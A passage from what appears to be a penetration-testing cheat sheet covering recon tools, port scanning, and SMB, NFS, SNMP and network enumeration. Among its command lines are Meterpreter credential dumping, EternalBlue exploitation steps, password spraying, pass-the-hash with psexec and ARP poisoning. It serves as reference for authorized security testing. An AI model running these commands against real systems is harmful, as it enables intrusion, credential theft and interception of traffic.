- `creds_msv` dump the system credentials

**Port forwarding**
- `meterpreter> portfwd -h`
  - Example `portfwd add -l 3389 -p 3389 -r 192.168.1.121`


### <ins>Others</ins>

**For a temporary server**
- `python -m SimpleHTTPServer 7331`
- `python3 -m http.server 7331`
- `php -S 0.0.0.0:8000`
- `ruby -run -e httpd . -p 9000`
- `busybox httpd -f -p 10000`

**For a temporary public server**
- [XAMPP](https://www.apachefriends.org/) + [ngrok](https://ngrok.com/)
- [beeceptor](https://beeceptor.com/)

**For a temporary FTP server**
- Host: `python -m pyftpdlib -w`
- Client:
  ```
  ftp
  open <IP> 2121
  anonymous
  
  ```

**For auths**
- [textverified.com](https://www.textverified.com/) for auths requiring a phone number
- [temp-mail.org](https://temp-mail.org/en/)

**To find parameters**
- [Arjun](https://github.com/s0md3v/Arjun) detection of the parameters present in the application
- [ParamSpider](https://github.com/devanshbatham/ParamSpider)

**Asset enumeration/discovery**
- [amass](https://github.com/OWASP/Amass)
  - `amass enum -brute -active -d target -o output/target.txt -v` 
- [subfinder](https://github.com/projectdiscovery/subfinder)
  - `subfinder -d target -all -o output/target_subfinder.txt"`
- [github-subdomains](https://github.com/gwen001/github-subdomains)
- [bgp.he.net](https://bgp.he.net/) to find ASN + `amass intel -asn <ASN>`
- [crt.sh](https://crt.sh/)
  - [Crtsh-Fetcher](https://github.com/m0pam/crtsh-fetcher)
  - To find new domains ` cat json.txt | jq -r '.[].common_name' | sed 's/\*//g' | sort -u | rev | cut -d "." -f 1,2 | rev | sort -u | tee out.txt`
- [gobuster](https://github.com/OJ/gobuster) + [all.txt by jhaddix](https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056)
- [dnsx](https://github.com/projectdiscovery/dnsx)
  - Reverse DNS lookup `cat ip.txt | dnsx -ptr -resp-only` 
- [VhostScan](https://github.com/codingo/VHostScan) to discover virtual hosts
- [gip](https://github.com/dalance/gip) a command-line tool and Rust library to check global IP address.
- [anew](https://github.com/tomnomnom/anew) to add only new subdomains
- [httpx](https://github.com/projectdiscovery/httpx)
  - `type scope.txt | httpx -sc -mc 404` find `404` pages
- [urless](https://github.com/xnl-h4ck3r/urless)
- [hakcheckurl](https://github.com/hakluke/hakcheckurl)
  - `python3 urless.py -i urls.txt | hakcheckurl | grep -v 404`


**Exploits**
- [SearchSploit](https://www.exploit-db.com/searchsploit)
  - `searchsploit afd windows -w -t`; `-w` to return the URL for https://www.exploitdb.com, `-t` to search the exploit title
- [Packet Storm](https://packetstormsecurity.com)
- [BugTraq](https://bugtraq.securityfocus.com/archive)
- [National Vulnerability Database](https://nvd.nist.gov/)
- [Browser Exploitation Framework (BeEF)](https://beefproject.com/)
- [PoC in GitHub](https://github.com/nomi-sec/PoC-in-GitHub)


**For Reporting**
- [Vulnerability Rating Taxonomy](https://bugcrowd.com/vulnerability-rating-taxonomy)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
- [PwnDoc](https://github.com/pwndoc/pwndoc)
- [Vulnrepo](https://vulnrepo.com/home)
- [PlexTrac](https://plextrac.com/)
- [Offensive Security Exam Report Template in Markdown](https://github.com/noraj/OSCP-Exam-Report-Template-Markdown)


**Misc tools**
- [URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)
- [base64encode.org](https://www.base64encode.org/)
- [Down or not](https://www.websiteplanet.com/webtools/down-or-not/)
- [DigitalOcean](https://www.digitalocean.com/) See [Setting Up Your Ubuntu Box for Pentest and Bug Bounty Automation](https://www.youtube.com/watch?v=YhUiAH5SIqk)
- [Exploit Database](https://www.exploit-db.com/)
- [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky)
- [Flipper Zero](https://flipperzero.one/)
- [Create a random text file](https://onlinefiletools.com/generate-random-text-file)
- [BruteSpray](https://github.com/x90skysn3k/brutespray) `python brutespray.py --file nmap.xml --threads 5 --hosts 5`
- [BadSecrets](https://github.com/blacklanternsecurity/badsecrets) a library and command line tool for finding secrets
- [Proxyman](https://proxyman.io/) to view requests from the app on your computer
- [filesec.io](https://filesec.io/)
- [malapi.io](https://malapi.io/)
- [lots-project.com](https://lots-project.com/)
- [lolbas-project.github.io](https://lolbas-project.github.io/)
- [gtfobins.github.io](https://gtfobins.github.io/)
- [loldrivers.io](https://www.loldrivers.io/)
- [WAF Bypass Tool](https://github.com/nemesida-waf/waf-bypass)
- [Forensia](https://github.com/PaulNorman01/Forensia)
- [peepdf - PDF Analysis Tool](https://eternal-todo.com/tools/peepdf-pdf-analysis-tool)


## Passive Information Gathering (OSINT)

### <ins>Notes</ins>
- [ ] Target validation
- [ ] Search for email addresses of employees
  - What's the format? Does it change for founders, chief officers etc.?
- [ ] Search for corporate social media accounts
- [ ] Use [whois](https://who.is/)
  - `whois targetcorp.com`
- [ ] [Google Dorking](#google-dorking)
  - Start searching for PHP files and directory listing
- [ ] Search for any company acquisitions of the target
- [ ] See also [Content Discovery](#content-discovery)
- [ ] See each section of this chapter

### <ins>Tools</ins>

- [Stack Overflow](https://stackoverflow.com/)
- [Information Gathering Frameworks](https://osintframework.com/)
- [Maltego](https://www.maltego.com/)
- [bgp.he.net](https://bgp.he.net/)
- [Crunchbase](https://www.crunchbase.com/)
- [OCCRP Aleph](https://aleph.occrp.org/)

### <ins>Target validation</ins>

- Use `WHOIS`, `nslookup` and `dnsrecon`
- [searchdns.netcraft.com](https://searchdns.netcraft.com/)
  - Search for registration information and site technology entries
- [Recon-ng](https://github.com/lanmaster53/recon-ng)
  - ```
    marketplace search github                                      Search the Marketplace for GitHub modules
    marketplace info recon/domains-hosts/google_site_web           Get information on a module
    marketplace install recon/domains-hosts/google_site_web        Install a module
    modules load recon/domains-hosts/google_site_web               Load a module
    info                                                           Get infos about module loaded
    options set SOURCE targetcorp.com                              Set a source
    run                                                            Run a module
    back                                                           Get  back to default
    show                                                           Show the results; hosts, companies, leaks etc.
    ```
  - Use `recon/domains-hosts/google_site_web` combined with `recon/hosts-hosts/resolve`
- Passively search for information in open-source projects and online code repositories.
  - [GitHub Dorking](#github-dorking)
  - [Gitrob](https://github.com/michenriksen/gitrob)
  - [Gitleaks](https://github.com/gitleaks/gitleaks)
  - [Source code review](#source-code-review)
- [Shodan](https://www.shodan.io/)
  ```
  hostname:targetcorp.com                  Search for TargetCorp’s domain
  hostname:targetcorp.com port:'22'        Search for TargetCorp’s domain running SSH
  ```
  - [Shodan for Chrome](https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap) and [for Firefox](https://addons.mozilla.org/en-US/firefox/addon/shodan_io/)
- [Security Headers Scanner](https://securityheaders.com/)
- [SSL Server Test](https://www.ssllabs.com/ssltest/)
- [DMARC Inspector](https://dmarcian.com/dmarc-inspector/)

### <ins>User Information Gathering</ins>

Note: A company may only approve tests of its own systems. Personal devices, outside email, and social media accounts used by employees often do not come under this authorisation.

#### Email Harvesting

- [theHarvester](https://github.com/laramies/theHarvester)
  ```
  theharvester -d targetcorp.com -b google                  -d specify target domain, -b set data source to search
  ```
- [hunter.io](https://hunter.io/)
- [Phonebook.cz](https://phonebook.cz/)
- [voilanorbert.com](https://www.voilanorbert.com/)
- [Clearbit](https://clearbit.com/)

Verify email addresses
- [Email Hippo](https://tools.emailhippo.com/)
- [Email Checker](https://email-checker.net/)

#### Social media tools

- [Social Searcher](https://www.social-searcher.com/)
- [Twofi](https://digi.ninja/projects/twofi.php)
- [linkedin2username](https://github.com/initstring/linkedin2username)


#### Data breaches

- [HaveIBeenPwned](https://haveibeenpwned.com/)
- [Breach-Parse](https://github.com/hmaverickadams/breach-parse)
- [WeLeakInfo](https://mobile.twitter.com/weleakinfo)
- [Dehashed](https://www.dehashed.com/)
  - [Hashes.com](https://hashes.com/en/decrypt/hash)

Malicious hackers frequently post stolen passwords on [Pastebin](https://pastebin.com/) or other less reputable websites. This is useful for generating wordlists.
- An example: [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

#### Acquisitions

Search for any acquisitions by the target
- [bgp.he.net](https://bgp.he.net/)
- [Crunchbase](https://www.crunchbase.com/)
- [OCCRP Aleph](https://aleph.occrp.org/)


## Active Information Gathering

### <ins>DNS Enumeration</ins>

**host command**
```
host www.targetcorp.com                         Find the A host record
host -t mx www.targetcorp.com                   Find the MX record
host -t txt www.targetcorp.com                  Find the TXT record
host -l <domain name> <dns server address>      Perform a DNS zone transfer; -l: list zone
```

**Brute force forward DNS name lookups** using a list like `possible_subs.txt` containing common hostnames (see [SecLists](https://github.com/danielmiessler/SecLists)):
```
for ip in $(cat possible_subs.txt); do host $ip.megacorpone.com; done
```

**Brute force reverse DNS names**
```
for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
```

**Tools**
- DNSRecon
  ```
  dnsrecon -d zonetransfer.com -t axfr                      Perform a zone transfer; -t: specify the type of enumeration to perform
  dnsrecon -d zonetransfer.com -D ~/list.txt -t brt         Brute forcing hostnames
  ```
- DNSenum
  ```
  dnsenum zonetransfer.me                                   Perform a zone transfer
  ```
- [Wappalyzer](https://www.wappalyzer.com/)
- [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
- [BuiltWith](https://builtwith.com/)


### <ins>Port Scanning</ins>

#### **Netcat**
```
nc -nvv -w 1 -z <IP> <PORT-RANGE>                        Use netcat to perform a TCP port scan
nc -nv -u -z -w 1 <IP> <PORT-RANGE>                      Use netcat to perform an UDP port scan
```

#### **Nmap**

```
nmap <IP>                                                            Simple nmap scan
nmap -p 1-65535 <IP>                                                 Scan all the ports
nmap -sS <IP>                                                        Stealth / SYN Scanning (will not appear in any application logs)
nmap -sT <IP>                                                        TCP connect scan
nmap -sU <IP>                                                        UDP scan
nmap -sS -sU <IP>                                                    Perform a combined UDP and SYN scan
nmap -sn <IP>                                                        Perform a network sweep
nmap -p 1-65535 -sV -T4 -Pn -n -vv -iL target.txt -oX out.xml        Discover everything including running services using a list of targets
nmap -sn <net_address_in_cdr>                                        Check hosts alive, adding -A you gather more info for a target
nmap -sT -A <IP-range>                                               Banner grabbing and/or service enumeration
nmap -sT -A --top-ports=20 <IP-range> -oG top-port-sweep.txt         Perform a top twenty port scan, save the output in greppable format
nmap -O <IP>                                                         OS fingerprinting
nmap -sV -sT -A <IP>                                                 Banner Grabbing, Service Enumeration

Find live hosts
---------------
nmap -v -sn <IP-range> -oG ping-sweep.txt
grep Up ping-sweep.txt | cut -d " " -f 2

Find web servers using port 80
------------------------------
nmap -p 80 <IP-range> -oG web-sweep.txt
grep open web-sweep.txt | cut -d " " -f 2

Nmap Scripting Engine (NSE)
---------------------------
nmap --script-help dns-zone-transfer                                  View information about a script, in this case "dns-zone-transfer"
nmap <IP> --script=smb-os-discovery                                   OS fingerprinting (SMB services)
nmap --script=dns-zone-transfer -p 53 ns2.zonetransfer.com            Perform a DNS zone transfer
nmap --script http-headers <IP>                                       OS fingerprinting (HTTP supported headers)
nmap --script http-title <IP>

Other usages
------------
nmap -vvv -A --reason --script="+(safe or default) and not broadcat -p - <IP>"

```

#### **Masscan**

```
masscan -p80 10.0.0.0/8                                               Look for all web servers using port 80 within a class A subnet
masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1   --rate specify the desired rate of packet transmission
                                                                      -e specify the raw network interface to use
                                                                      --router-ip specify the IP address for the appropriate gateway
```

#### Other tools

- [httprobe](https://github.com/tomnomnom/httprobe) designed to find web servers
  - `type subs.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 150 > out.txt`
- [naabu](https://github.com/projectdiscovery/naabu) a fast port scanner
  - A simple usage using a list of subdomains: `naabu -v -list subs.txt -stats -o out.txt`
  - Discover everything faster, excluding some ports maybe already checked: `naabu -l 1.txt -v -p - -exclude-ports 80,443,81,3000,3001,8000,8080,8443 -c 1000 -rate 7000 -stats -o 1_o.txt`
- **Powershell**
  - SMB port scanning `Test-NetConnection -Port 445 <IP>`
  - `1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IP>", $_)) "TCP port $_ is open"} 2>$null`
- [nmapAutomator](https://github.com/21y4d/nmapAutomator)

### <ins>SMB Enumeration</ins>

**Resources**
- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
  - `crackmapexec smb <IP> -u usernames.txt -p passwords.txt --continue-on-success`
  - `crackmapexec smb <IP> -u <user> -p <password> --shares`
- ["A Little Guide to SMB Enumeration"](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)

**Enumerate SMB Shares**
```
smbclient
---------
smbclient -L <IP>                                                     see which shares are available
smbclient //<IP>/<share>                                              connect to the SMB share
smbclient -p <port> -L //<IP>/ -U <username> --password=<password>    connect to the SMB share
get <file>                                                            get files

net
---
net view \\<IP> /All                                                  see which shares are available
net use \\<IP>\<share>                                                connect to the SMB share
copy \\<IP>\<share>\<file>                                            get files

more enumeration
----------------
sudo nmap -vvv -p 137 -sU --script=nbstat.nse 192.168.190.140
nmap -vvv -p 139,445 --script=smb* 192.168.228.63
crackmapexec smb 192.168.157.31 -u 'guest' -p ''
crackmapexec smb 192.168.228.63 -u '' -p '' --shares
- see anon logins
- use flags --shares and --rid-brute
smbclient \\\\\192.168.228.63\\
smbclient -U 'Guest' -L \\\\\192.168.134.126\\
smbclient --no-pass -L //192.168.203.172
enum4linux -a -u "CRAFT2\\thecybergeek" -p "winniethepooh" 192.168.203.188
```

**Connect to a share**
```
smbclient //192.168.134.126/print$
smbclient \\\\\192.168.212.172\\Shenzi
smbclient //192.168.203.172/DocumentsShare -U CRAFT2/thecybergeek
mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' /mnt
```

**Use nmap to scan for the NetBIOS service**<br/>
`nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254`

**Use nbtscan to collect additional NetBIOS information**<br/>
`sudo nbtscan -r 10.11.1.0/24`

**Find various nmap SMB NSE scripts**<br/>
`ls -1 /usr/share/nmap/scripts/smb*`<br/>
Example: `nmap -v -p 139, 445 --script=smb-os-discovery <IP>`

**Determining whether a host is vulnerable to the MS08_067 vulnerability**
- `nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <IP>`
  - Note: the script parameter `unsafe=1`, the scripts that will run are almost guaranteed to crash a vulnerable system

**EternalBlue**
- https://redteamzone.com/EternalBlue/
- `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 192.168.1.17`
- `sudo impacket-smbserver -smb2support share /home/kali/Documents/windows-attack/nc/`
First option
- `python 42315 10.10.10.4`
  - exploit: https://www.exploit-db.com/exploits/42315
Second option
- With AutoBlue-MS17-010
  1. `cd shellcode` > `./shell_prep.sh`
  2. run a listener
  3. `python eternalblue_exploit7.py 10.10.14.10 shellcode/sc_x64.bin`
Third option
- with metasploit
  - `use windows/smb/ms17_010_psexec`

**General notes**
- Remember that you can transfer files to the share with `copy <file> \\<IP>\share`
  - Also when using `sudo impacket-smbserver -smb2support share .`
- check if this smb hosts files of the web service, it might be possible to upload a shell
- maybe it's possible to do phishing
- nmap -Pn -p 139,445 --open --max-hostgroup 3 --script=smb-vuln* 10.10.10.4

### <ins>NFS Enumeration</ins>

**Find and identify hosts that have portmapper/rpcbind running using nmap**<br/>
`nmap -v -p 111 10.11.1.1-254`

**Query rpcbind in order to get registered services**<br/>
`nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254`

**Nmap NFS NSE Scripts**<br/>
`ls -1 /usr/share/nmap/scripts/nfs*`<br/>
Run all these scripts with `nmap -p 111 --script nfs* <IP>`

**Example of entire /home directory shared**
```
Mount the directory and access the NFS share
--------------------------------------------
mkdir home
sudo mount -o nolock <IP>:/home ~/home/
cd home/ && ls

Add a local user
----------------
sudo adduser pwn                                         Add the new user "pwn"
sudo sed -i -e 's/1001/1014/g' /etc/passwd               Change the sed of the "pwn" user
cat /etc/passwd | grep pwn                               Verify that the changes have been made
```


### <ins>SMTP Enumeration</ins>

**Interesting commands**
- `VRFY` request asks the server to verify an email address
- `EXPN` asks the server for the membership of a mailing list
- Use telnet to connect to the target to gather information
  - `telnet <IP> 25`
- Port scanning with Powershell
  - `Test-NetConnection -Port 25 <IP>`

**Use nc to validate SMTP users**<br/>
`nc -nv <IP> 25`

**Use nmap for SMTP enumeration**<br/>
`nmap -p 25 --script=smtp-enum-users <IP>`

### <ins>SNMP Enumeration</ins>

**Use nmap to perform a SNMP scan**<br/>
`sudo nmap -sU --open -p 161 <IP-range> -oG open-snmp.txt`

**Use onesixtyone to brute force community strings**
1. Build a text file containing community strings
   ```
   echo public > community
   echo private >> community
   echo manager >> community
   ```
2. Build a text file containing IP addresses to scan<br/>
   `for ip in $(seq 1 254); do echo 192.168.45.$ip; done > ips`
3. Use [onesixtyone](https://github.com/trailofbits/onesixtyone)<br/>
   `onesixtyone -c community -i ips`

Note: Provided we at least know the SNMP read-only community string (in most cases is "public")<br/>
**Use snmpwalk to enumerate**<br/>
- The entire MIB tree: `snmpwalk -c public -v1 -t 10 <IP>`
  - `-c`: specify the community string
  - `-v`: specify the SNMP version number
  - `-t 10` to increase the timeout period to 10 seconds
-  Windows users: `snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25`
- Windows processes: `snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2`
- Installed software: `snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2`


### <ins>HTTP / HTTPS enumeration</ins>

- [httprobe](https://github.com/tomnomnom/httprobe)
  - example: `cat subdomains.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 150 > output.txt`
- [naabu](https://github.com/projectdiscovery/naabu) + [httprobe](https://github.com/tomnomnom/httprobe), to find hidden web ports
  - example
    ``` 
    naabu -v -list subdomains.txt  -exclude-ports 80,443,81,3000,3001,8000,8080,8443 -c 1000 -rate 7000 -stats -o naabu.txt
    cat naabu.txt | httprobe > results.txt
    ```

### <ins>SSH enumeration</ins>

- Port `22`, connect with
  - `ssh <ip>`, `ssh <ip> -oKexAlgorithms=+<option>`, ``ssh <ip> -oKexAlgorithms=+<option>` -c <cipher>`
  - [PuTTY](https://www.putty.org/)
- Search for a banner, to get more info

## Content Discovery

**Some tips**
- If the application is ASP.NET, search for `Appsettings.json`
- Use recursion. If you encounter a `401` response, search with waybackmachine
- Search for past reports in the same program
- [changedetection.io](https://github.com/dgtlmoon/changedetection.io)

**Check the tech of a target with**
- [Wappalyzer](https://www.wappalyzer.com/)
- [Webanalyze](https://github.com/rverton/webanalyze) Port of Wappalyzer for command line
  `./webanalyze -host example.com -crawl 1`
- [Shodan for Chrome](https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap) and [for Firefox](https://addons.mozilla.org/en-US/firefox/addon/shodan_io/)

**Tools**
- [feroxbuster](https://github.com/epi052/feroxbuster)
  - `feroxbuster -u https://example.com/ --proxy http://127.0.0.1:8080 -k -w wordlist.txt -s 200,403`
  - `feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -C 404,400,401,403 --url http://192.168.244.140:8000`
- [dirsearch](https://github.com/maurosoria/dirsearch)
  - `dirsearch -l list.txt -x 404,500,501,502,503 -e *`
  - `dirsearch -u target.io -x 404,500,501,502,503 -e *`
  - `dirsearch -u <target> -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -R 2 --full-url -t 75 --suffix=.php`
  - `dirsearch -e * -x 404,401,500,503 -u http://192.168.244.140:8000`
  - `dirsearch -u http://192.168.134.126 -w /usr/share/wordlists/dirb/common.txt -r -R 2 --full-url -t 75 --suffix=.txt`
- [DIRB](https://salsa.debian.org/pkg-security-team/dirb)
  - `dirb http://www.target.com -r -z 10`
- [dirbuster](https://github.com/KajanM/DirBuster)
- [gobuster](https://github.com/OJ/gobuster)
  - `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://192.168.228.63:450`
  - `gobuster dir -u http://192.168.190.112 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt`
- [ffuf](https://github.com/ffuf/ffuf)
  - `ffuf -u 'http://<IP>/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0`

**Crawling**
- [gospider](https://github.com/jaeles-project/gospider)
  - `gospider -s target -c 10 -d 4 -t 20 --sitemap --other-source -p http://localhost:8080 --cookie "0=1" --blacklist ".(svg|png|gif|ico|jpg|jpeg|bpm|mp3|mp4|ttf|woff|ttf2|woff2|eot|eot2|swf|swf2|css)"`
- [hakrawler](https://github.com/hakluke/hakrawler)
  - `cat target.txt | hakrawler -u -insecure -t 20 -proxy http://localhost:8080 -h "Cookie: 0=1"`
- [Katana](https://github.com/projectdiscovery/katana)
  - `katana -u target -jc -kf -aff -proxy http://127.0.0.1:8080 -H "Cookie: 0=1"`

**Wordlists**
- [SecLists](https://github.com/danielmiessler/SecLists)
- [wordlists.assetnote.io](https://wordlists.assetnote.io/)
- [content_discovery_all.txt](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10)
- [OneListForAll](https://github.com/six2dez/OneListForAll)
- [wordlistgen](https://github.com/ameenmaali/wordlistgen)
- [Scavenger](https://github.com/0xDexter0us/Scavenger)

**Wordlists kali**
- `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt`
- `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
- `/usr/share/wordlists`
- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/seclists/Discovery/Web-Content/big.txt`
- note: use keywords that you find during the test (maybe use `cewl` or build a wordlist)

**To find more endpoints**
- [Apkleak](https://github.com/dwisiswant0/apkleaks) to get endpoints from an apk
- [Source2Url](https://github.com/danielmiessler/Source2URL/blob/master/Source2URL) to get endpoints from a source code
- [waymore](https://github.com/xnl-h4ck3r/waymore) more results from the Wayback Machine
- [BurpJSLinkFinder](https://github.com/InitRoot/BurpJSLinkFinder)
- [trashcompactor](https://github.com/michael1026/trashcompactor) to remove URLs with duplicate funcionality based on script resources included

### <ins>Google Dorking</ins>
- `ext:` search for: php, php3, aspx, asp, jsp, xhtml, phtml, html, xsp, nsf, form, swf
- `filetype:` search for filetypes like html or php
- `-filetype:html` omit filetype `html`
- Search also for pdf, xlsx, bak and similar, they may contain some infos
- `site:` to target a website and its subdomains
- `inurl:&` to search for parameters
- `intitle:` to search interesting pages like admin, register, login etc.
- `"Seeing something unexpected? Take a look at the GitHub profile guide." "COMPANY-TARGET" site:http://github.com` [[Reference](https://twitter.com/c3l3si4n/status/1580564006263173122)]
- `intext:"© copyright COMPANY YEAR"` [[Reference](https://twitter.com/intigriti/status/1592497655774871553)]
- `site:target.com intext:login intext:username intext:password`
- Exposed .git `intext:"index of /.git" "parent directory"`
- Search for s3 buckets `site:.s3.amazonaws.com "COMPANY"`
- Find CVEs, like CVE-2019-9647 `intext:"Powered by Gila CMS"`
- Errors `site:target.com intext:"Warning: mysql_num_rows()"`
- `intitle:"Index of /" + ".htaccess"`
- `intitle:"index of" "parent directory"` directory listing
- [Google Dorks - Cloud Storage:](https://twitter.com/TakSec/status/1616852760141627393)
  ```
  site:http://s3.amazonaws.com "target.com"
  site:http://blob.core.windows.net "target.com"
  site:http://googleapis.com "target.com"
  site:http://drive.google.com "target.com"
  ```
- [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
- [DorkSearch.com](https://dorksearch.com/)
- [Refine web searches | Google](https://support.google.com/websearch/answer/2466433?hl=en)


### <ins>GitHub Dorking</ins>
- sensitive words: `password, api_key, access_key, dbpassword, dbuser, pwd, pwds, aws_access, key, token, credentials, pass, pwd, passwd, private, preprod, appsecret`
- languages: `json, bash, shell, java etc.`, example `HEROKU_API_KEY language:json`
- extensions: `extensions: bat, config, ini, env etc.`
- filename: `netrpc, .git-credentials, .history, .htpasswd, bash_history`, example `filename:users`
- [Other dorks](https://github.com/techgaun/github-dorks#list-of-dorks)


### <ins>Shodan Dorking</ins>
- `hostname:targetcorp.com` Search for TargetCorp’s domain
- `hostname:targetcorp.com port:'22'` Search for TargetCorp’s domain running SSH


## Networking

**Tools**
- [Echo Mirage](https://resources.infosecinstitute.com/topic/echo-mirage-walkthrough/)
- [Wireshark](https://www.wireshark.org/)
- [PCredz](https://github.com/lgandx/PCredz)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
  - `impacket-mssqlclient <user>:<password>@<IP> -windows-auth`
  - `impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> <USERNAME>@<IP>`
  - `impacket-psexec <USERNAME>:<PASSWORD>@<IP>`
- [putty](https://www.putty.org/)
- [MobaXterm](https://mobaxterm.mobatek.net/)
- [proxychains](https://github.com/haad/proxychains)
- [Samba suite](https://www.samba.org/)
- [Enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files)
- [Winfo](https://packetstormsecurity.com/search/?q=winfo&s=files)
- [enum4linux](https://www.kali.org/tools/enum4linux/)
- [macchanger](https://github.com/acrogenesis/macchanger)

#### Checking the routing table
```
ip route        on Linux box
route print     on Windows
netstat -r      on Mac OSX
```

#### Discover the MAC address
```
ip addr         on Linux
ipconfig /all   on Windows
ifconfig        on MacOS
```

#### Change MAC addess
- [How to change or spoof the MAC address in Windows (7 ways)](https://www.digitalcitizen.life/change-mac-address-windows/)
- [How to Change Your MAC Address on Linux](https://www.makeuseof.com/how-to-change-mac-address-on-linux/)
  - [macchanger](https://github.com/acrogenesis/macchanger)

#### Check listening ports and the current TCP connections
```
netstat -ano    on Windows
netstat -tunp   on Linux

on MacOS
--------
netstat -p tcp -p udp
lsof -n -i4TCP -i4UDP
```

#### Add new routes
```
ip route add <net_address_in_cdr> via <interface_gateway>                             on Linux
route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway>     on Windows
nmap -sn <net_address_in_cdr>                                                         Check hosts alive, adding -A you gather more info for a target
```

#### Null session
```
Windows
-------
nbtstat /?                               help command
nbtstat -A <Target-IP>                   display information about a target
NET VIEW <Target-IP>                     enumerate the shares of a target
NET USE \\<Target-IP>\IPC$ '' /u:''      connect to a window share; connect to 'IPC$' share by using empty username and password

Linux
-----
nmblookup -A <Target-IP>                 same as nbtstat for Linux; display information about a target
smbclient -L //<Target-IP> -N            access Windows shares
smbclient //<Target-IP>/IPC$ -N          connect to a window share; connect to 'IPC$' share by using empty username and password

Enum
----
enum -s <Target-IP>                      enumerate the shares of a machine
enum -U <Target-IP>                      enumerate the users of a machine
enum -P <Target-IP>                      check the password policy of a machine

Winfo
-----
winfo <Target-IP> -n                     use winfo with null session

```

#### Enumeration
```
ip addr                                                                             query available network interfaces
ip route                                                                            enumerate network routes
for i in $(seq 1 254); do nc -zv -w 1 <octet>.<octet>.<octet>.$i <port>; done       bash loop with Netcat to sweep for port <PORT> in a subnet
```

#### Target analysis
- `tracert <target>` shows details about the path that a packet takes from the device sender to the target destination specified
- `for ip in $(echo '<IP>'); do ping -c 5 $ip; traceroute $ip; echo '\nnslookup'; nslookup $ip; done`

#### Check ARP cache
```
ip neighbour    on Linux
apr -a          on Windows
arp             on *nix OS
```

#### ARP Poisoning

1. The goal is to (1) trick the victim to save in the ARP Cache my MAC address (the attacker) associated it with the router IP and (2) the router to send the traffic back to you, this to perform a MITM
2. First, enable the Linux Kernel IP Forwarding to transform a Linux Box into a router `echo 1 > /proc/sys/net/ipv4/ip_forward`
3. Run arpspoof `arpspoof -i <interface> -t <target> -r <host>`
   - Check also [Ettercap](ettercap-project.org)

An example
1. `echo 1 > /proc/sys/net/ipv4/ip_forward`
2. `arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16`


#### Well-known Ports

| Service       | Port          |
| ---           | ---           |
| SMTP          | 25            |
| SSH           | 22            |
| POP3          | 110           |
| IMAP          | 143           |
| HTTP          | 80            |
| HTTPS         | 443           |
| NETBIOS       | 137, 138, 139 |
| SFTP          | 115           |
| Telnet        | 23            |
| FTP           | 21            |
| RDP           | 3389          |
| MySQL         | 3306          |
| MS SQL Server | 1433          |
| Confluence    | 8090          |

#### Common Port Vulnerabilities

See : ["Open Port Vulnerabilities List by Dirk Schrader"](https://blog.netwrix.com/2022/08/04/open-port-vulnerabilities-list/)

| Ports | Vulnerabilities |
| ---  | --- |
| 20, 21 (FTP) | - Brute-forcing <br/>- Anonymous authentication (`anonymous` as username and password) <br/>- Cross-site scripting <br/>- Directory traversal attacks |
| 22 (SSH) | - leaked SSH keys <br/>- Brute-forcing |
| 23 (Telnet) | - Brute-forcing <br/>- Spoofing <br/>-Credential sniffing |
| 25 (SMTP) | - Spoofing <br/>- Spamming |
| 53 (DNS) | - DDoS |
| 137, 139 (NetBIOS over TCP) 445 (SMB) | - [EternalBlue](https://www.cisecurity.org/wp-content/uploads/2019/01/Security-Primer-EternalBlue.pdf) <br/>- Capturing NTLM hashes <br/>- Brute-force |
| 80, 443, 8080 and 8443 (HTTP and HTTPS) | - Cross-site Scripting (XSS) <br/>- SQL injections <br/>- Cross-Site Request Forgeries (CSRF) <br/>- DDoS |
| 1433,1434 and 3306 (SQL Server and MySQL) | - Default configurations <br/>- DDoS |
| 3389 (Remote Desktop) | - [BlueKeep](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-0708) <br/>- Leaked or weak user authentication |
| 8090 (Confluence) | [CVE-2022-26134](#cve-2022-26134) |


## Source code review
- Search for known dangerous functions used on user-supplied input
  - example, `eval(` can cause command injection without proper sanitization
- Search for hardcoded credentials such as API keys, encryption keys and database passwords
